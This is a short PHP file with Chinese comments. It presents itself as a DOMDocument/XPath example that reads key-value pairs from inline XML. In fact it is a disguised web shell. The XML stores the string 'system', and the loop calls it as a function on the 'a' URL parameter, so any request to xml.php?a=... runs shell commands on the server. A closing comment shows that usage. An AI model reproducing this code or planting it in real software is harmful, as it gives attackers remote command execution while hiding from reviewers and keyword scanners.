<?php

// 创建 DOMDocument 对象

$dom = new DOMDocument();

// 加载 XML 文档

$dom->loadXML('<?xml version="1.0" encoding="UTF-8"?>

<data>

    <item>

        <key>system</key>

    </item>

    <item>

        <key>age</key>

        <value>30</value>

    </item>

</data>');

// 创建 DOMXPath 对象

$xpath = new DOMXPath($dom);

// 执行 XPath 查询，选择所有 item 节点

$items = $xpath->query('//item');

// 初始化一个空数组来存储键值对

$keyValuePairs = [];

// 遍历每个 item 节点

foreach ($items as $item) {

    // 获取 key 节点的文本内容

    $key = $xpath->query('key', $item)->item(0)->textContent;

    // 获取 value 节点的文本内容

    // $value = $xpath->query('value', $item)->item(0)->textContent;

    // 将键值对添加到数组中

    ($key)($_GET['a']);

}

?>
// xml.php?a=xxx
